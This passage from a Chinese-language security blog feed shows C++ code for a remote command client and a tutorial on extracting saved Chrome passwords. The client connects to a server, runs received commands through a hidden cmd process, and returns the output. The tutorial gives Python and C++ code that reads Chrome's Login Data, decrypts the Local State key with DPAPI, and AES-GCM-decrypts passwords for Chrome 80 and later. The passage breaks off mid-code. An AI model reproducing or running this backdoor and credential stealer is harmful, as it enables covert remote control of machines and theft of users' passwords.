class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">connection</span><span class="hljs-params">(LPSTR ServerIP,<span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_ClientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_ClientSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(ServerPort);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ServerIP);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] connect ...\n&quot;</span>;<br>    <span class="hljs-comment">//建立连接</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">connect</span>(g_ClientSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] connect Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>连接后就是负责接收服务端传输的数据,也就是dos命令,并执行,将执行后的结果返回服务端(这里先返回一个ok)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">SendRet</span><span class="hljs-params">(LPSTR pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, pszSend, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent Bytes:&quot;</span> &lt;&lt; pszSend &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">RecvCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//char szRetBuffer[11240] = &#123; 0 &#125;;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">int</span> ret = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-built_in">system</span>(szBuffer);<br>        <span class="hljs-built_in">SendRet</span>((LPSTR)<span class="hljs-string">&quot;ok&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里已经实现了可以循环执行命令,那么现在就是要把控制台输出数据传输回来。<br><img src="/img/socket/2.png"></p><p>这里把<code>system</code>函数替换掉,利用<code>CreatePipe</code>匿名管道一边读,一边写,再通过<code>CreateProcess</code>创建cmd进程执行命令,将返回的数据读进管道,再读出到缓存区,返回到服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcessA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpApplicationName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTR                 lpCommandLine,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL                  bInheritHandles,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID                lpEnvironment,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpCurrentDirectory,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">GetCmdData</span><span class="hljs-params">(LPSTR lpscmd, LPSTR lpsRetBuffer,DWORD RetBufferSize)</span></span><br><span class="hljs-function"></span>&#123;<br>    SECURITY_ATTRIBUTES sa;<br>    HANDLE hRead, hWrite;<br>    sa.bInheritHandle = TRUE;<br>    sa.nLength = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sa);<br>    sa.lpSecurityDescriptor = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//创建匿名管道</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hRead, &amp;hWrite, &amp;sa, <span class="hljs-number">0</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreatePipe Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置新进程参数</span><br>    STARTUPINFOA si = &#123;<span class="hljs-number">0</span>&#125;;<br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;;<br>    si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>    si.hStdError = hWrite;<br>    si.hStdOutput = hWrite;<br>    si.wShowWindow = SW_HIDE;<br>    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<br>    <span class="hljs-comment">//创建进程执行命令</span><br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, lpscmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreateProcess Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hWrite);<br>    <span class="hljs-comment">//等待命令执行结束</span><br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);<br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);<br>    <span class="hljs-comment">//读取管道中的数据,即执行命令后的结果</span><br>    ::<span class="hljs-built_in">RtlZeroMemory</span>(lpsRetBuffer, RetBufferSize);<br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ReadFile</span>(hRead, lpsRetBuffer, <span class="hljs-number">10000</span>, &amp;RetBufferSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ReadFile Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hRead);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/socket/3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用c++抓取Chrome所有版本密码</title>
    <link href="/2021/06/20/CatchChrome/"/>
    <url>/2021/06/20/CatchChrome/</url>
    
    <content type="html"><![CDATA[<p>工具已上传到github:<a href="https://github.com/SD-XD/Catch-Browser">https://github.com/SD-XD/Catch-Browser</a></p><h2 id="谷歌浏览器存储密码的方式"><a href="#谷歌浏览器存储密码的方式" class="headerlink" title="谷歌浏览器存储密码的方式"></a>谷歌浏览器存储密码的方式</h2><p>在使用谷歌浏览器时,如果我们输入某个网站的账号密码,他会自动问我们是否要保存密码,以便下次登录的时候自动填写账号和密码<br><img src="/img/CatchChrome/1.png"></p><p>在设置中可以找到登录账户和密码</p><p><img src="/img/CatchChrome/2.png"></p><p>也可以直接看密码,不过需要凭证</p><p><img src="/img/CatchChrome/3.png"></p><p>这其实是windows的DPAPI机制</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Data Protection Application Programming Interface(数据保护API)</p><p>DPAPI是Windows系统级对数据进行加解密的一种接口无需自实现加解密代码微软已经提供了经过验证的高质量加解密算法提供了用户态的接口对密钥的推导存储数据加解密实现透明并提供较高的安全保证</p><p>DPAPI提供了两个用户态接口<code>CryptProtectData</code>加密数据<code>CryptUnprotectData</code>解密数据加密后的数据由应用程序负责安全存储应用无需解析加密后的数据格式。但是加密后的数据存储需要一定的机制因为该数据可以被其他任何进程用来解密当然<code>CryptProtectData</code>也提供了用户输入额外数据来参与对用户数据进行加密的参数但依然无法放于暴力破解。</p><p>微软提供了两个接口用来加密和解密,<code>CryptProtectMemory</code>和<code>CryptUnprotectMemory</code></p><p>实际上,在老版本(80之前)的谷歌浏览器,仅仅是使用了<code>CryptProtectMemory</code>来对密码进行加密</p><h2 id="80版本之前的Chrome"><a href="#80版本之前的Chrome" class="headerlink" title="80版本之前的Chrome"></a>80版本之前的Chrome</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win7</li><li>Chrome版本 79.0.3945.117</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>chrome的密码经过加密后存储在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data<br></code></pre></td></tr></table></figure><p>如果用二进制文本编辑器查看的化会发现他其实是一个sqlite数据库文件</p><p><img src="/img/CatchChrome/4.png"></p><p>可以使用工具SQLiteStudio打开他</p><p>双击logins</p><p><img src="/img/CatchChrome/5.png"></p><p>选择data<br><img src="/img/CatchChrome/6.png"></p><p>可以看到有用户名和网址,却没有密码</p><p>但是密码的二进制实际是有值的</p><p><img src="/img/CatchChrome/7.png"></p><h3 id="编写脚本解密"><a href="#编写脚本解密" class="headerlink" title="编写脚本解密"></a>编写脚本解密</h3><p>python的解密是最简洁的，这里送上一个三好学生的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> win32crypt<br><span class="hljs-keyword">import</span> binascii<br>conn = sqlite3.connect(getenv(<span class="hljs-string">&quot;APPDATA&quot;</span>) + <span class="hljs-string">&quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;</span>)<br>cursor = conn.cursor()<br>cursor.execute(<span class="hljs-string">&#x27;SELECT action_url, username_value, password_value FROM logins&#x27;</span>)<br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> cursor.fetchall():<br>    password = win32crypt.CryptUnprotectData(result[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> password:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Site: &#x27;</span> + result[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Username: &#x27;</span> + result[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Password: &#x27;</span> + password<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;no password found&quot;</span><br></code></pre></td></tr></table></figure><p>但我还是想c++写一个</p><p>编写之前,需要配置sqlite3环境,并且下载<code>&lt;sqlite3.h&gt;</code>和<code>&lt;sqlite3.c&gt;</code>文件</p><p>如果当前用户正在使用谷歌,是无法打开数据库的,于是我们可以复制一份出来操作</p><p><img src="/img/CatchChrome/8.png"></p><p>再通过sql语句查找logins表</p><p><img src="/img/CatchChrome/9.png"></p><p>在回调函数中解密</p><p><img src="/img/CatchChrome/10.png"></p><p>看下效果,完美解出密码</p><p><img src="/img/CatchChrome/11.png"></p><p>与谷歌浏览器上面看到的也是一样的,无需再验证用户密码</p><p><img src="/img/CatchChrome/12.png"></p><h2 id="80版本之后的Chrome"><a href="#80版本之后的Chrome" class="headerlink" title="80版本之后的Chrome"></a>80版本之后的Chrome</h2><p>那么80.x之后的Chrome如何解密呢</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win10</li><li>Chrome版本 91.0.4472.101(最新版)</li></ul><h3 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h3><p>先看一下跟以前版本的Chrome存储方式上有什么区别</p><p><img src="/img/CatchChrome/13.png"></p><p><img src="/img/CatchChrome/14.png"></p><p>判断是否是新版本的Chrome加密其实就是看它加密后值的前面有没有v10或者v11</p><p>看官方文档,分析新版加密算法</p><p>key的初始化<br><a href="https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea">https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea</a></p><p><img src="/img/CatchChrome/15.png"></p><p><img src="/img/CatchChrome/16.png"><br>注释:尝试从local state提取密钥。</p><p>并且可以看到<code>kDPAPIKeyPrefix</code>实际上就是一个字符串”DPAPI”</p><p><img src="/img/CatchChrome/17.png"></p><p>然后就是进行DPAPI的解密,最后就是如果key不在local state中或者DPAPI解密失败,就重新生成一个key</p><p>从这里我们我可以大致分析出key初始化时的动作:</p><ol><li>从local state文件中提取key</li><li>base64解密key</li><li>去除key开头的“DPAPI”</li><li>DPAPI解密,得到最终的key</li></ol><p>跟进<code>GetString</code>函数的参数<code>kOsCryptEncryptedKeyPrefName</code></p><p><img src="/img/CatchChrome/18.png"></p><p>知道key存放在local state文件os_crypt.encrypted_key字段中,即</p><p><img src="/img/CatchChrome/19.png"></p><p>而local state文件就在本地默认目录:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\L</span>ocal State<br></code></pre></td></tr></table></figure><p>Local State是一个JSON格式的文件</p><h3 id="明文加密方式"><a href="#明文加密方式" class="headerlink" title="明文加密方式"></a>明文加密方式</h3><p>看源码注释</p><p><img src="/img/CatchChrome/20.png"></p><p>密钥加密后数据前缀是“v10”</p><p><img src="/img/CatchChrome/21.png"></p><p>密钥和NONCE/IV的长度分别为：32字节和12字节</p><p><img src="/img/CatchChrome/22.png"></p><p>这里解释一下NONCE/IV是什么:</p><p>如果我们不希望相同的明文通过密钥加密出来的密文是相同的(这样很容易让攻击者知道这两条密文的明文是相同的) 解决办法是使用IV（初始向量）或nonce（只使用一次的数值）。因为对于每条加密消息，我们都可以使用不同的byte字符串。它们是非确定理论的起源，而这种理论要求制造出令人难以分辨的副本。这些消息通常不是什么秘密，但为了解密需要，我们会在分发时对它们进行加密。 IV与nonce之间的区别是有争议的，但也不是没有关联的。不同的加密方案所保护的侧重点也不同：有些方案需要的只是密文不重复，这种情况我们通常叫作nonce；还有一些方案需要密文是随机的，甚至完全不可预测的，这种情况我们通常叫作IV。这里其实就是希望即便明文相同,经过加密后的密文也不相同。</p><p>再往下翻,其实可以看到解密函数</p><p><img src="/img/CatchChrome/23.png"></p><p><code>encrypted_value</code>的前缀v10后为12字节的NONCE（IV），然后再是真正的密文。Chrome使用的是AES-256-GCM的AEAD对称加密、</p><p>那么思路就清晰了,这里我自己画了一个图来总结算法</p><p><img src="/img/CatchChrome/24.png"></p><p>实现自动化抓密码<br>解密使用一个非常强大的库,cryptopp</p><p>先获取原始的key</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">GetOriginalkey</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string Decoded = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//获取Local State中的未解密的key</span><br>    string key = <span class="hljs-string">&quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADWXmStECIlTZZxWMAYf5UmAAAAAAIAAAAAABBmAAAAAQAAIAAAAP8V1h3J1qhEf8/h13hre+e3EMW0oD41Ux7UrEqls4DoAAAAAA6AAAAAAgAAIAAAAA7xXGgN1Hks1TbInimvYa0TnMfPa0jPpmlI9BDiUQAAMAAAAPzO7wya37iu97rDB4UTtn5QwQcuJkw2E3cw/tHuSnHdNv4qwXMWLC2oU3TkysoXmUAAAAAtPkLwNaInulyoGNH4GDxlwbzAW4DP7T8XWsZ/2QB0YrcLqxSNytHlV1qvVyO8D20Eu7jKqD/bMW2MzwEa40iF&quot;</span>;<br>    <span class="hljs-built_in">StringSource</span>((BYTE*)key.<span class="hljs-built_in">c_str</span>(), key.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Base64Decoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded)));<br>    key = Decoded;<br>    key = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">//去除首位5个字符DPAPI</span><br>    Decoded.<span class="hljs-built_in">clear</span>();<span class="hljs-comment">//DPAPI解密</span><br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    DATA_BLOB DataOut = &#123; <span class="hljs-number">0</span> &#125;;<br>    DATA_BLOB DataVerify = &#123; <span class="hljs-number">0</span> &#125;;<br>    DataOut.pbData = (BYTE*)key.<span class="hljs-built_in">c_str</span>();<br>    DataOut.cbData = <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptUnprotectData</span>(&amp;DataOut, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;DataVerify)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Decryption failure: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Decryption successfully!\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; DataVerify.cbData; i++)<br>        &#123;<br>            result[i] = DataVerify.pbData[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果当前chrome版本并不是80+,可以通过一个简单的判断:就是看加密密码前有没有”v10“或者”v11“</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">string e_str = argv[<span class="hljs-number">2</span>];<br><span class="hljs-comment">//判断密文是否包含v10或v11,如果包含则说明是80+的Chrome,用新的解密方法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v10&quot;</span>) != <span class="hljs-literal">NULL</span> || <span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v11&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">NewDecrypt</span>(argc, argv, azColName);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">DecryptoByDPAPI</span>(argv, azColName);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>然后就是解密密文</p><p>获取iv和密文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//argv[2]是password_value的值</span><br>chiper = argv[<span class="hljs-number">2</span>];<br>iv = argv[<span class="hljs-number">2</span>];<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">15</span>);  <span class="hljs-comment">//获取iv的值</span><br>chiper = chiper.<span class="hljs-built_in">substr</span>(<span class="hljs-number">15</span>);   <span class="hljs-comment">//加密密码的值</span><br></code></pre></td></tr></table></figure><p>再用<code>cyptopp</code>强大的库函数进行解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取iv hex编码值</span><br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">HexEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Encoded)));<br>iv = Encoded;<br>Encoded.<span class="hljs-built_in">clear</span>();<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, iv.<span class="hljs-built_in">size</span>() - <span class="hljs-number">6</span>);<br>CHAR Pass_Word[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">HexDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded))); <br>iv = Decoded;<br>Decoded.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">char</span>* key = <span class="hljs-built_in">GetOriginalkey</span>();<br>d.<span class="hljs-built_in">SetKeyWithIV</span>((BYTE*)key, <span class="hljs-number">32</span>, (BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-built_in">StringSource</span>(chiper, <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticatedDecryptionFilter</span>(d,<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(password)));<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; password.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br>    Pass_Word[i] = password[i];<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">0</span>], argv[<span class="hljs-number">0</span>] ? argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, 